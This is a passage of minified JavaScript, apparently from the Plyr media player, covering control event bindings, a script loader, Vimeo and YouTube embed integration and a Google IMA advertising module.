                ),
                  this.bind(
                    n.progress,
                    "mouseenter mouseleave mousemove",
                    function (e) {
                      return ce.updateSeekTooltip.call(t, e);
                    }
                  ),
                  F.isWebkit &&
                    Array.from(_.call(t, 'input[type="range"]')).forEach(
                      function (n) {
                        e.bind(n, "input", function (e) {
                          return ce.updateRangeFill.call(t, e.target);
                        });
                      }
                    ),
                  t.config.toggleInvert &&
                    !m.element(n.display.duration) &&
                    this.bind(n.display.currentTime, "click", function () {
                      0 !== t.currentTime &&
                        ((t.config.invertTime = !t.config.invertTime),
                        ce.timeUpdate.call(t));
                    }),
                  this.bind(
                    n.inputs.volume,
                    i,
                    function (e) {
                      t.volume = e.target.value;
                    },
                    "volume"
                  ),
                  this.bind(n.controls, "mouseenter mouseleave", function (e) {
                    n.controls.hover = !t.touch && "mouseenter" === e.type;
                  }),
                  this.bind(
                    n.controls,
                    "mousedown mouseup touchstart touchend touchcancel",
                    function (e) {
                      n.controls.pressed = ["mousedown", "touchstart"].includes(
                        e.type
                      );
                    }
                  ),
                  this.bind(n.controls, "focusin", function () {
                    var n = t.config,
                      i = t.elements,
                      a = t.timers;
                    L(i.controls, n.classNames.noTransition, !0),
                      Ee.toggleControls.call(t, !0),
                      setTimeout(function () {
                        L(i.controls, n.classNames.noTransition, !1);
                      }, 0);
                    var s = e.touch ? 3e3 : 4e3;
                    clearTimeout(a.controls),
                      (a.controls = setTimeout(function () {
                        return Ee.toggleControls.call(t, !1);
                      }, s));
                  }),
                  this.bind(
                    n.inputs.volume,
                    "wheel",
                    function (e) {
                      var n = e.webkitDirectionInvertedFromDevice,
                        i = a(
                          [e.deltaX, -e.deltaY].map(function (e) {
                            return n ? -e : e;
                          }),
                          2
                        ),
                        s = i[0],
                        o = i[1],
                        r = Math.sign(Math.abs(s) > Math.abs(o) ? s : o);
                      t.increaseVolume(r / 50);
                      var l = t.media.volume;
                      ((1 === r && l < 1) || (-1 === r && l > 0)) &&
                        e.preventDefault();
                    },
                    "volume",
                    !1
                  );
              },
            },
          ]),
          t
        );
      })();
    "undefined" != typeof window
      ? window
      : "undefined" != typeof global
      ? global
      : "undefined" != typeof self && self;
    var Ce,
      Se =
        ((function (e, t) {
          e.exports = (function () {
            var e = function () {},
              t = {},
              n = {},
              i = {};
            function a(e, t) {
              if (e) {
                var a = i[e];
                if (((n[e] = t), a))
                  for (; a.length; ) a[0](e, t), a.splice(0, 1);
              }
            }
            function s(t, n) {
              t.call && (t = { success: t }),
                n.length ? (t.error || e)(n) : (t.success || e)(t);
            }
            function o(t, n, i, a) {
              var s,
                r,
                l = document,
                c = i.async,
                u = (i.numRetries || 0) + 1,
                d = i.before || e,
                h = t.replace(/^(css|img)!/, "");
              (a = a || 0),
                /(^css!|\.css$)/.test(t)
                  ? ((s = !0),
                    ((r = l.createElement("link")).rel = "stylesheet"),
                    (r.href = h))
                  : /(^img!|\.(png|gif|jpg|svg)$)/.test(t)
                  ? ((r = l.createElement("img")).src = h)
                  : (((r = l.createElement("script")).src = t),
                    (r.async = void 0 === c || c)),
                (r.onload =
                  r.onerror =
                  r.onbeforeload =
                    function (e) {
                      var l = e.type[0];
                      if (s && "hideFocus" in r)
                        try {
                          r.sheet.cssText.length || (l = "e");
                        } catch (e) {
                          18 != e.code && (l = "e");
                        }
                      if ("e" == l && (a += 1) < u) return o(t, n, i, a);
                      n(t, l, e.defaultPrevented);
                    }),
                !1 !== d(t, r) && l.head.appendChild(r);
            }
            function r(e, n, i) {
              var r, l;
              if ((n && n.trim && (r = n), (l = (r ? i : n) || {}), r)) {
                if (r in t) throw "LoadJS";
                t[r] = !0;
              }
              !(function (e, t, n) {
                var i,
                  a,
                  s = (e = e.push ? e : [e]).length,
                  r = s,
                  l = [];
                for (
                  i = function (e, n, i) {
                    if (("e" == n && l.push(e), "b" == n)) {
                      if (!i) return;
                      l.push(e);
                    }
                    --s || t(l);
                  },
                    a = 0;
                  a < r;
                  a++
                )
                  o(e[a], i, n);
              })(
                e,
                function (e) {
                  s(l, e), a(r, e);
                },
                l
              );
            }
            return (
              (r.ready = function (e, t) {
                return (
                  (function (e, t) {
                    e = e.push ? e : [e];
                    var a,
                      s,
                      o,
                      r = [],
                      l = e.length,
                      c = l;
                    for (
                      a = function (e, n) {
                        n.length && r.push(e), --c || t(r);
                      };
                      l--;

                    )
                      (s = e[l]),
                        (o = n[s]) ? a(s, o) : (i[s] = i[s] || []).push(a);
                  })(e, function (e) {
                    s(t, e);
                  }),
                  r
                );
              }),
              (r.done = function (e) {
                a(e, []);
              }),
              (r.reset = function () {
                (t = {}), (n = {}), (i = {});
              }),
              (r.isDefined = function (e) {
                return e in t;
              }),
              r
            );
          })();
        })((Ce = { exports: {} }), Ce.exports),
        Ce.exports);
    function Me(e) {
      return new Promise(function (t, n) {
        Se(e, { success: t, error: n });
      });
    }
    function Ne(e) {
      e && !this.embed.hasPlayed && (this.embed.hasPlayed = !0),
        this.media.paused === e &&
          ((this.media.paused = !e),
          k.call(this, this.media, e ? "play" : "pause"));
    }
    var Le = {
      setup: function () {
        var e = this;
        L(this.elements.wrapper, this.config.classNames.embed, !0),
          Le.setAspectRatio.call(this),
          m.object(window.Vimeo)
            ? Le.ready.call(this)
            : Me(this.config.urls.vimeo.sdk)
                .then(function () {
                  Le.ready.call(e);
                })
                .catch(function (t) {
                  e.debug.warn("Vimeo API failed to load", t);
                });
      },
      setAspectRatio: function (e) {
        var t = a(
            (m.string(e) ? e : this.config.ratio).split(":").map(Number),
            2
          ),
          n = (100 / t[0]) * t[1];
        if (
          ((Le.padding = n),
          (this.elements.wrapper.style.paddingBottom = "".concat(n, "%")),
          this.supported.ui)
        ) {
          var i = (240 - n) / 4.8;
          this.media.style.transform = "translateY(-".concat(i, "%)");
        }
      },
      ready: function () {
        var e = this,
          t = this,
          n = de({
            loop: t.config.loop.active,
            autoplay: t.autoplay,
            byline: !1,
            portrait: !1,
            title: !1,
            speed: !0,
            transparent: 0,
            gesture: "media",
            playsinline: !this.config.fullscreen.iosNative,
          }),
          i = t.media.getAttribute("src");
        m.empty(i) && (i = t.media.getAttribute(t.config.attributes.embed.id));
        var s,
          o =
            ((s = i),
            m.empty(s)
              ? null
              : m.number(Number(s))
              ? s
              : s.match(/^.*(vimeo.com\/|video\/)(\d+).*/)
              ? RegExp.$2
              : s),
          r = A("iframe"),
          l = Q(t.config.urls.vimeo.iframe, o, n);
        r.setAttribute("src", l),
          r.setAttribute("allowfullscreen", ""),
          r.setAttribute("allowtransparency", ""),
          r.setAttribute("allow", "autoplay");
        var c = A("div", {
          poster: t.poster,
          class: t.config.classNames.embedContainer,
        });
        c.appendChild(r),
          (t.media = S(c, t.media)),
          ie(Q(t.config.urls.vimeo.api, o), "json").then(function (e) {
            if (!m.empty(e)) {
              var n = new URL(e[0].thumbnail_large);
              (n.pathname = "".concat(n.pathname.split("_")[0], ".jpg")),
                Ee.setPoster.call(t, n.href).catch(function () {});
            }
          }),
          (t.embed = new window.Vimeo.Player(r, {
            autopause: t.config.autopause,
            muted: t.muted,
          })),
          (t.media.paused = !0),
          (t.media.currentTime = 0),
          t.supported.ui && t.embed.disableTextTrack(),
          (t.media.play = function () {
            return Ne.call(t, !0), t.embed.play();
          }),
          (t.media.pause = function () {
            return Ne.call(t, !1), t.embed.pause();
          }),
          (t.media.stop = function () {
            t.pause(), (t.currentTime = 0);
          });
        var u = t.media.currentTime;
        Object.defineProperty(t.media, "currentTime", {
          get: function () {
            return u;
          },
          set: function (e) {
            var n = t.embed,
              i = t.media,
              a = t.paused,
              s = t.volume,
              o = a && !n.hasPlayed;
            (i.seeking = !0),
              k.call(t, i, "seeking"),
              Promise.resolve(o && n.setVolume(0))
                .then(function () {
                  return n.setCurrentTime(e);
                })
                .then(function () {
                  return o && n.pause();
                })
                .then(function () {
                  return o && n.setVolume(s);
                })
                .catch(function () {});
          },
        });
        var d = t.config.speed.selected;
        Object.defineProperty(t.media, "playbackRate", {
          get: function () {
            return d;
          },
          set: function (e) {
            t.embed
              .setPlaybackRate(e)
              .then(function () {
                (d = e), k.call(t, t.media, "ratechange");
              })
              .catch(function (e) {
                "Error" === e.name && ce.setSpeedMenu.call(t, []);
              });
          },
        });
        var h = t.config.volume;
        Object.defineProperty(t.media, "volume", {
          get: function () {
            return h;
          },
          set: function (e) {
            t.embed.setVolume(e).then(function () {
              (h = e), k.call(t, t.media, "volumechange");
            });
          },
        });
        var p = t.config.muted;
        Object.defineProperty(t.media, "muted", {
          get: function () {
            return p;
          },
          set: function (e) {
            var n = !!m.boolean(e) && e;
            t.embed.setVolume(n ? 0 : t.config.volume).then(function () {
              (p = n), k.call(t, t.media, "volumechange");
            });
          },
        });
        var f,
          g = t.config.loop;
        Object.defineProperty(t.media, "loop", {
          get: function () {
            return g;
          },
          set: function (e) {
            var n = m.boolean(e) ? e : t.config.loop.active;
            t.embed.setLoop(n).then(function () {
              g = n;
            });
          },
        }),
          t.embed
            .getVideoUrl()
            .then(function (e) {
              (f = e), ce.setDownloadLink.call(t);
            })
            .catch(function (t) {
              e.debug.warn(t);
            }),
          Object.defineProperty(t.media, "currentSrc", {
            get: function () {
              return f;
            },
          }),
          Object.defineProperty(t.media, "ended", {
            get: function () {
              return t.currentTime === t.duration;
            },
          }),
          Promise.all([t.embed.getVideoWidth(), t.embed.getVideoHeight()]).then(
            function (t) {
              var n, i, a;
              (Le.ratio =
                ((n = t[0]),
                (i = t[1]),
                (a = (function e(t, n) {
                  return 0 === n ? t : e(n, t % n);
                })(n, i)),
                "".concat(n / a, ":").concat(i / a))),
                Le.setAspectRatio.call(e, Le.ratio);
            }
          ),
          t.embed.setAutopause(t.config.autopause).then(function (e) {
            t.config.autopause = e;
          }),
          t.embed.getVideoTitle().then(function (n) {
            (t.config.title = n), Ee.setTitle.call(e);
          }),
          t.embed.getCurrentTime().then(function (e) {
            (u = e), k.call(t, t.media, "timeupdate");
          }),
          t.embed.getDuration().then(function (e) {
            (t.media.duration = e), k.call(t, t.media, "durationchange");
          }),
          t.embed.getTextTracks().then(function (e) {
            (t.media.textTracks = e), he.setup.call(t);
          }),
          t.embed.on("cuechange", function (e) {
            var n = e.cues,
              i = (void 0 === n ? [] : n).map(function (e) {
                return (
                  (t = e.text),
                  (n = document.createDocumentFragment()),
                  (i = document.createElement("div")),
                  n.appendChild(i),
                  (i.innerHTML = t),
                  n.firstChild.innerText
                );
                var t, n, i;
              });
            he.updateCues.call(t, i);
          }),
          t.embed.on("loaded", function () {
            (t.embed.getPaused().then(function (e) {
              Ne.call(t, !e), e || k.call(t, t.media, "playing");
            }),
            m.element(t.embed.element) && t.supported.ui) &&
              t.embed.element.setAttribute("tabindex", -1);
          }),
          t.embed.on("play", function () {
            Ne.call(t, !0), k.call(t, t.media, "playing");
          }),
          t.embed.on("pause", function () {
            Ne.call(t, !1);
          }),
          t.embed.on("timeupdate", function (e) {
            (t.media.seeking = !1),
              (u = e.seconds),
              k.call(t, t.media, "timeupdate");
          }),
          t.embed.on("progress", function (e) {
            (t.media.buffered = e.percent),
              k.call(t, t.media, "progress"),
              1 === parseInt(e.percent, 10) &&
                k.call(t, t.media, "canplaythrough"),
              t.embed.getDuration().then(function (e) {
                e !== t.media.duration &&
                  ((t.media.duration = e),
                  k.call(t, t.media, "durationchange"));
              });
          }),
          t.embed.on("seeked", function () {
            (t.media.seeking = !1), k.call(t, t.media, "seeked");
          }),
          t.embed.on("ended", function () {
            (t.media.paused = !0), k.call(t, t.media, "ended");
          }),
          t.embed.on("error", function (e) {
            (t.media.error = e), k.call(t, t.media, "error");
          }),
          t.on("enterfullscreen exitfullscreen", function (e) {
            var n = t.fullscreen.target;
            if (n === t.elements.container) {
              var i = "enterfullscreen" === e.type,
                s = a(Le.ratio.split(":").map(Number), 2),
                o = s[0] > s[1] ? "width" : "height";
              n.style[o] = i ? "".concat(Le.padding, "%") : null;
            }
          }),
          setTimeout(function () {
            return Ee.build.call(t);
          }, 0);
      },
    };
    function xe(e) {
      e && !this.embed.hasPlayed && (this.embed.hasPlayed = !0),
        this.media.paused === e &&
          ((this.media.paused = !e),
          k.call(this, this.media, e ? "play" : "pause"));
    }
    var Ie,
      _e = {
        setup: function () {
          var e = this;
          L(this.elements.wrapper, this.config.classNames.embed, !0),
            _e.setAspectRatio.call(this),
            m.object(window.YT) && m.function(window.YT.Player)
              ? _e.ready.call(this)
              : (Me(this.config.urls.youtube.sdk).catch(function (t) {
                  e.debug.warn("YouTube API failed to load", t);
                }),
                (window.onYouTubeReadyCallbacks =
                  window.onYouTubeReadyCallbacks || []),
                window.onYouTubeReadyCallbacks.push(function () {
                  _e.ready.call(e);
                }),
                (window.onYouTubeIframeAPIReady = function () {
                  window.onYouTubeReadyCallbacks.forEach(function (e) {
                    e();
                  });
                }));
        },
        getTitle: function (e) {
          var t = this;
          if (m.function(this.embed.getVideoData)) {
            var n = this.embed.getVideoData().title;
            if (m.empty(n))
              return (this.config.title = n), void Ee.setTitle.call(this);
          }
          var i = this.config.keys.google;
          m.string(i) &&
            !m.empty(i) &&
            ie(Q(this.config.urls.youtube.api, e, i))
              .then(function (e) {
                m.object(e) &&
                  ((t.config.title = e.items[0].snippet.title),
                  Ee.setTitle.call(t));
              })
              .catch(function () {});
        },
        setAspectRatio: function () {
          var e = this.config.ratio.split(":");
          this.elements.wrapper.style.paddingBottom = "".concat(
            (100 / e[0]) * e[1],
            "%"
          );
        },
        ready: function () {
          var e = this,
            t = e.media.getAttribute("id");
          if (m.empty(t) || !t.startsWith("youtube-")) {
            var n = e.media.getAttribute("src");
            m.empty(n) &&
              (n = e.media.getAttribute(this.config.attributes.embed.id));
            var i,
              a,
              s =
                ((i = n),
                m.empty(i)
                  ? null
                  : i.match(
                      /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|&v=)([^#&?]*).*/
                    )
                  ? RegExp.$2
                  : i),
              o =
                ((a = e.provider),
                "".concat(a, "-").concat(Math.floor(1e4 * Math.random()))),
              r = A("div", { id: o, poster: e.poster });
            e.media = S(r, e.media);
            var l = function (e) {
              return "https://img.youtube.com/vi/"
                .concat(s, "/")
                .concat(e, "default.jpg");
            };
            Ae(l("maxres"), 121)
              .catch(function () {
                return Ae(l("sd"), 121);
              })
              .catch(function () {
                return Ae(l("hq"));
              })
              .then(function (t) {
                return Ee.setPoster.call(e, t.src);
              })
              .then(function (t) {
                t.includes("maxres") ||
                  (e.elements.poster.style.backgroundSize = "cover");
              })
              .catch(function () {}),
              (e.embed = new window.YT.Player(o, {
                videoId: s,
                playerVars: {
                  autoplay: e.config.autoplay ? 1 : 0,
                  hl: e.config.hl,
                  controls: e.supported.ui ? 0 : 1,
                  rel: 0,
                  showinfo: 0,
                  iv_load_policy: 3,
                  modestbranding: 1,
                  disablekb: 1,
                  playsinline: 1,
                  widget_referrer: window ? window.location.href : null,
                  cc_load_policy: e.captions.active ? 1 : 0,
                  cc_lang_pref: e.config.captions.language,
                },
                events: {
                  onError: function (t) {
                    if (!e.media.error) {
                      var n = t.data,
                        i =
                          {
                            2: "The request contains an invalid parameter value. For example, this error occurs if you specify a video ID that does not have 11 characters, or if the video ID contains invalid characters, such as exclamation points or asterisks.",
                            5: "The requested content cannot be played in an HTML5 player or another error related to the HTML5 player has occurred.",
                            100: "The video requested was not found. This error occurs when a video has been removed (for any reason) or has been marked as private.",
                            101: "The owner of the requested video does not allow it to be played in embedded players.",
                            150: "The owner of the requested video does not allow it to be played in embedded players.",
                          }[n] || "An unknown error occured";
                      (e.media.error = { code: n, message: i }),
                        k.call(e, e.media, "error");
                    }
                  },
                  onPlaybackRateChange: function (t) {
                    var n = t.target;
                    (e.media.playbackRate = n.getPlaybackRate()),
                      k.call(e, e.media, "ratechange");
                  },
                  onReady: function (t) {
                    if (!m.function(e.media.play)) {
                      var n = t.target;
                      _e.getTitle.call(e, s),
                        (e.media.play = function () {
                          xe.call(e, !0), n.playVideo();
                        }),
                        (e.media.pause = function () {
                          xe.call(e, !1), n.pauseVideo();
                        }),
                        (e.media.stop = function () {
                          n.stopVideo();
                        }),
                        (e.media.duration = n.getDuration()),
                        (e.media.paused = !0),
                        (e.media.currentTime = 0),
                        Object.defineProperty(e.media, "currentTime", {
                          get: function () {
                            return Number(n.getCurrentTime());
                          },
                          set: function (t) {
                            e.paused && !e.embed.hasPlayed && e.embed.mute(),
                              (e.media.seeking = !0),
                              k.call(e, e.media, "seeking"),
                              n.seekTo(t);
                          },
                        }),
                        Object.defineProperty(e.media, "playbackRate", {
                          get: function () {
                            return n.getPlaybackRate();
                          },
                          set: function (e) {
                            n.setPlaybackRate(e);
                          },
                        });
                      var i = e.config.volume;
                      Object.defineProperty(e.media, "volume", {
                        get: function () {
                          return i;
                        },
                        set: function (t) {
                          (i = t),
                            n.setVolume(100 * i),
                            k.call(e, e.media, "volumechange");
                        },
                      });
                      var a = e.config.muted;
                      Object.defineProperty(e.media, "muted", {
                        get: function () {
                          return a;
                        },
                        set: function (t) {
                          var i = m.boolean(t) ? t : a;
                          (a = i),
                            n[i ? "mute" : "unMute"](),
                            k.call(e, e.media, "volumechange");
                        },
                      }),
                        Object.defineProperty(e.media, "currentSrc", {
                          get: function () {
                            return n.getVideoUrl();
                          },
                        }),
                        Object.defineProperty(e.media, "ended", {
                          get: function () {
                            return e.currentTime === e.duration;
                          },
                        }),
                        (e.options.speed = n.getAvailablePlaybackRates()),
                        e.supported.ui && e.media.setAttribute("tabindex", -1),
                        k.call(e, e.media, "timeupdate"),
                        k.call(e, e.media, "durationchange"),
                        clearInterval(e.timers.buffering),
                        (e.timers.buffering = setInterval(function () {
                          (e.media.buffered = n.getVideoLoadedFraction()),
                            (null === e.media.lastBuffered ||
                              e.media.lastBuffered < e.media.buffered) &&
                              k.call(e, e.media, "progress"),
                            (e.media.lastBuffered = e.media.buffered),
                            1 === e.media.buffered &&
                              (clearInterval(e.timers.buffering),
                              k.call(e, e.media, "canplaythrough"));
                        }, 200)),
                        setTimeout(function () {
                          return Ee.build.call(e);
                        }, 50);
                    }
                  },
                  onStateChange: function (t) {
                    var n = t.target;
                    switch (
                      (clearInterval(e.timers.playing),
                      e.media.seeking &&
                        [1, 2].includes(t.data) &&
                        ((e.media.seeking = !1), k.call(e, e.media, "seeked")),
                      t.data)
                    ) {
                      case -1:
                        k.call(e, e.media, "timeupdate"),
                          (e.media.buffered = n.getVideoLoadedFraction()),
                          k.call(e, e.media, "progress");
                        break;
                      case 0:
                        xe.call(e, !1),
                          e.media.loop
                            ? (n.stopVideo(), n.playVideo())
                            : k.call(e, e.media, "ended");
                        break;
                      case 1:
                        e.media.paused && !e.embed.hasPlayed
                          ? e.media.pause()
                          : (xe.call(e, !0),
                            k.call(e, e.media, "playing"),
                            (e.timers.playing = setInterval(function () {
                              k.call(e, e.media, "timeupdate");
                            }, 50)),
                            e.media.duration !== n.getDuration() &&
                              ((e.media.duration = n.getDuration()),
                              k.call(e, e.media, "durationchange")));
                        break;
                      case 2:
                        e.muted || e.embed.unMute(), xe.call(e, !1);
                    }
                    k.call(e, e.elements.container, "statechange", !1, {
                      code: t.data,
                    });
                  },
                },
              }));
          }
        },
      },
      je = {
        setup: function () {
          this.media
            ? (L(
                this.elements.container,
                this.config.classNames.type.replace("{0}", this.type),
                !0
              ),
              L(
                this.elements.container,
                this.config.classNames.provider.replace("{0}", this.provider),
                !0
              ),
              this.isEmbed &&
                L(
                  this.elements.container,
                  this.config.classNames.type.replace("{0}", "video"),
                  !0
                ),
              this.isVideo &&
                ((this.elements.wrapper = A("div", {
                  class: this.config.classNames.video,
                })),
                w(this.media, this.elements.wrapper),
                (this.elements.poster = A("div", {
                  class: this.config.classNames.poster,
                })),
                this.elements.wrapper.appendChild(this.elements.poster)),
              this.isHTML5
                ? z.extend.call(this)
                : this.isYouTube
                ? _e.setup.call(this)
                : this.isVimeo && Le.setup.call(this))
            : this.debug.warn("No media element found!");
        },
      },
      Oe = (function () {
        function t(n) {
          var i = this;
          e(this, t),
            (this.player = n),
            (this.publisherId = n.config.ads.publisherId),
            (this.playing = !1),
            (this.initialized = !1),
            (this.elements = { container: null, displayContainer: null }),
            (this.manager = null),
            (this.loader = null),
            (this.cuePoints = null),
            (this.events = {}),
            (this.safetyTimer = null),
            (this.countdownTimer = null),
            (this.managerPromise = new Promise(function (e, t) {
              i.on("loaded", e), i.on("error", t);
            })),
            this.load();
        }
        return (
          n(t, [
            {
              key: "load",
              value: function () {
                var e = this;
                this.enabled &&
                  (m.object(window.google) && m.object(window.google.ima)
                    ? this.ready()
                    : Me(this.player.config.urls.googleIMA.sdk)
                        .then(function () {
                          e.ready();
                        })
                        .catch(function () {
                          e.trigger(
                            "error",
                            new Error("Google IMA SDK failed to load")
                          );
                        }));
              },
            },
            {
              key: "ready",
              value: function () {
                var e = this;
                this.startSafetyTimer(12e3, "ready()"),
                  this.managerPromise.then(function () {
                    e.clearSafetyTimer("onAdsManagerLoaded()");
                  }),
                  this.listeners(),
                  this.setupIMA();
              },
            },
            {
              key: "setupIMA",
              value: function () {
                (this.elements.container = A("div", {
                  class: this.player.config.classNames.ads,
                })),
                  this.player.elements.container.appendChild(
                    this.elements.container
                  ),
                  google.ima.settings.setVpaidMode(
                    google.ima.ImaSdkSettings.VpaidMode.ENABLED
                  ),
                  google.ima.settings.setLocale(
                    this.player.config.ads.language
                  ),
                  (this.elements.displayContainer =
                    new google.ima.AdDisplayContainer(this.elements.container)),
                  this.requestAds();
              },
            },
            {
              key: "requestAds",
              value: function () {
                var e = this,
                  t = this.player.elements.container;
                try {
                  (this.loader = new google.ima.AdsLoader(
                    this.elements.displayContainer
                  )),
                    this.loader.addEventListener(
                      google.ima.AdsManagerLoadedEvent.Type.ADS_MANAGER_LOADED,
                      function (t) {
                        return e.onAdsManagerLoaded(t);
                      },
                      !1
                    ),
                    this.loader.addEventListener(
                      google.ima.AdErrorEvent.Type.AD_ERROR,
                      function (t) {
                        return e.onAdError(t);
                      },
                      !1
                    );
                  var n = new google.ima.AdsRequest();
                  (n.adTagUrl = this.tagUrl),
                    (n.linearAdSlotWidth = t.offsetWidth),
                    (n.linearAdSlotHeight = t.offsetHeight),
                    (n.nonLinearAdSlotWidth = t.offsetWidth),
                    (n.nonLinearAdSlotHeight = t.offsetHeight),
                    (n.forceNonLinearFullSlot = !1),
                    n.setAdWillPlayMuted(!this.player.muted),
                    this.loader.requestAds(n);
                } catch (e) {
                  this.onAdError(e);
                }
              },
            },
            {
              key: "pollCountdown",
              value: function () {
                var e = this;
                if (
                  !(
                    arguments.length > 0 &&
                    void 0 !== arguments[0] &&
                    arguments[0]
                  )
                )
                  return (
                    clearInterval(this.countdownTimer),
                    void this.elements.container.removeAttribute(
                      "data-badge-text"
                    )
                  );
                this.countdownTimer = setInterval(function () {
                  var t = le(Math.max(e.manager.getRemainingTime(), 0)),
                    n = ""
                      .concat(te("advertisement", e.player.config), " - ")
                      .concat(t);
                  e.elements.container.setAttribute("data-badge-text", n);
                }, 100);
              },
            },
            {
              key: "onAdsManagerLoaded",
              value: function (e) {
                var t = this;
                if (this.enabled) {
                  var n = new google.ima.AdsRenderingSettings();
                  (n.restoreCustomPlaybackStateOnAdBreakComplete = !0),
                    (n.enablePreloading = !0),
                    (this.manager = e.getAdsManager(this.player, n)),
                    (this.cuePoints = this.manager.getCuePoints()),
                    m.empty(this.cuePoints) ||
                      this.cuePoints.forEach(function (e) {
                        if (0 !== e && -1 !== e && e < t.player.duration) {
                          var n = t.player.elements.progress;
                          if (m.element(n)) {
                            var i = (100 / t.player.duration) * e,
                              a = A("span", {
                                class: t.player.config.classNames.cues,
                              });
                            (a.style.left = "".concat(i.toString(), "%")),
                              n.appendChild(a);
                          }
                        }
                      }),
                    this.manager.setVolume(this.player.volume),
                    this.manager.addEventListener(
                      google.ima.AdErrorEvent.Type.AD_ERROR,
                      function (e) {
                        return t.onAdError(e);
                      }
                    ),
                    Object.keys(google.ima.AdEvent.Type).forEach(function (e) {
                      t.manager.addEventListener(
                        google.ima.AdEvent.Type[e],
                        function (e) {
                          return t.onAdEvent(e);
                        }
                      );
                    }),
                    this.trigger("loaded");
                }
              },
            },
            {
              key: "onAdEvent",
              value: function (e) {
                var t = this,
                  n = this.player.elements.container,
                  i = e.getAd(),
                  a = function (e) {
                    var n = "ads".concat(e.replace(/_/g, "").toLowerCase());
                    k.call(t.player, t.player.media, n);
                  };
                switch (e.type) {
                  case google.ima.AdEvent.Type.LOADED:
                    this.trigger("loaded"),
                      a(e.type),
                      this.pollCountdown(!0),
                      i.isLinear() ||
                        ((i.width = n.offsetWidth),
                        (i.height = n.offsetHeight));
                    break;
                  case google.ima.AdEvent.Type.ALL_ADS_COMPLETED:
                    a(e.type), this.loadAds();
                    break;
                  case google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED:
                    a(e.type), this.pauseContent();
                    break;
                  case google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED:
                    a(e.type), this.pollCountdown(), this.resumeContent();
                    break;
                  case google.ima.AdEvent.Type.STARTED:
                  case google.ima.AdEvent.Type.MIDPOINT:
                  case google.ima.AdEvent.Type.COMPLETE:
                  case google.ima.AdEvent.Type.IMPRESSION:
                  case google.ima.AdEvent.Type.CLICK:
                    a(e.type);
                }
              },
            },
            {
              key: "onAdError",
              value: function (e) {
                this.cancel(), this.player.debug.warn("Ads error", e);
              },
            },
            {
              key: "listeners",
              value: function () {
                var e,
                  t = this,
                  n = this.player.elements.container;
                this.player.on("ended", function () {
                  t.loader.contentComplete();
                }),
                  this.player.on("seeking", function () {
                    return (e = t.player.currentTime);
                  }),
                  this.player.on("seeked", function () {
                    var n = t.player.currentTime;
                    m.empty(t.cuePoints) ||
                      t.cuePoints.forEach(function (i, a) {
                        e < i &&
                          i < n &&
                          (t.manager.discardAdBreak(),
                          t.cuePoints.splice(a, 1));
                      });
                  }),
                  window.addEventListener("resize", function () {
                    t.manager &&
                      t.manager.resize(
                        n.offsetWidth,
                        n.offsetHeight,
                        google.ima.ViewMode.NORMAL
                      );
                  });
              },
            },
            {
              key: "play",
              value: function () {
                var e = this,
                  t = this.player.elements.container;
                this.managerPromise || this.resumeContent(),
                  this.managerPromise
                    .then(function () {
                      e.elements.displayContainer.initialize();
                      try {
                        e.initialized ||
                          (e.manager.init(
                            t.offsetWidth,
                            t.offsetHeight,
                            google.ima.ViewMode.NORMAL
                          ),
                          e.manager.start()),
                          (e.initialized = !0);
                      } catch (t) {
                        e.onAdError(t);
                      }
                    })
                    .catch(function () {});
              },
            },
            {
              key: "resumeContent",
              value: function () {
                (this.elements.container.style.zIndex = ""),
                  (this.playing = !1),
                  this.player.currentTime < this.player.duration &&
                    this.player.play();
              },
            },
            {
              key: "pauseContent",
              value: function () {
                (this.elements.container.style.zIndex = 3),
                  (this.playing = !0),
                  this.player.pause();
              },
            },
            {
              key: "cancel",
              value: function () {
                this.initialized && this.resumeContent(),
                  this.trigger("error"),
                  this.loadAds();
              },
            },
            {
              key: "loadAds",
              value: function () {
                var e = this;
                this.managerPromise
                  .then(function () {
                    e.manager && e.manager.destroy(),
                      (e.managerPromise = new Promise(function (t) {
                        e.on("loaded", t), e.player.debug.log(e.manager);
                      })),
                      e.requestAds();
                  })
                  .catch(function () {});
              },
            },
            {
              key: "trigger",
              value: function (e) {
                for (
                  var t = this,
                    n = arguments.length,
                    i = new Array(n > 1 ? n - 1 : 0),
                    a = 1;
                  a < n;
                  a++
                )
                  i[a - 1] = arguments[a];
                var s = this.events[e];
                m.array(s) &&
                  s.forEach(function (e) {
                    m.function(e) && e.apply(t, i);
                  });
              },
            },
            {
              key: "on",
              value: function (e, t) {
                return (
                  m.array(this.events[e]) || (this.events[e] = []),
                  this.events[e].push(t),
                  this
                );
              },
            },
            {
              key: "startSafetyTimer",
              value: function (e, t) {
                var n = this;
                this.player.debug.log("Safety timer invoked from: ".concat(t)),
                  (this.safetyTimer = setTimeout(function () {
                    n.cancel(), n.clearSafetyTimer("startSafetyTimer()");
                  }, e));
              },
            },
            {
              key: "clearSafetyTimer",
              value: function (e) {
                m.nullOrUndefined(this.safetyTimer) ||
                  (this.player.debug.log(
                    "Safety timer cleared from: ".concat(e)
                  ),
                  clearTimeout(this.safetyTimer),
                  (this.safetyTimer = null));
              },
            },
            {
              key: "enabled",
              get: function () {
                return (
                  this.player.isHTML5 &&
                  this.player.isVideo &&
                  this.player.config.ads.enabled &&
                  !m.empty(this.publisherId)
                );
              },
            },
            {
              key: "tagUrl",
              get: function () {
                var e = {
                  AV_PUBLISHERID: "58c25bb0073ef448b1087ad6",
                  AV_CHANNELID: "5a0458dc28a06145e4519d21",
                  AV_URL: window.location.hostname,
                  cb: Date.now(),
                  AV_WIDTH: 640,
                  AV_HEIGHT: 480,
                  AV_CDIM2: this.publisherId,
                };
                return ""
                  .concat("https://go.aniview.com/api/adserver6/vast/", "?")
                  .concat(de(e));
              },
            },
          ]),
          t
        );
      })(),
      qe = {
        insertElements: function (e, t) {
          var n = this;
          m.string(t)
            ? E(e, this.media, { src: t })
            : m.array(t) &&
              t.forEach(function (t) {
                E(e, n.media, t);
              });
        },
        change: function (e) {
          var t = this;
          Y(e, "sources.length")
            ? (z.cancelRequests.call(this),
              this.destroy.call(
                this,
                function () {
                  (t.options.quality = []),
                    P(t.media),
                    (t.media = null),
                    m.element(t.elements.container) &&
                      t.elements.container.removeAttribute("class");
                  var n = e.sources,
                    i = e.type,
                    s = a(n, 1)[0],
                    o = s.provider,
                    r = void 0 === o ? ge.html5 : o,
                    l = s.src,
                    c = "html5" === r ? i : "div",
                    u = "html5" === r ? {} : { src: l };
                  Object.assign(t, {
                    provider: r,
                    type: i,
                    supported: W.check(i, r, t.config.playsinline),
                    media: A(c, u),
                  }),
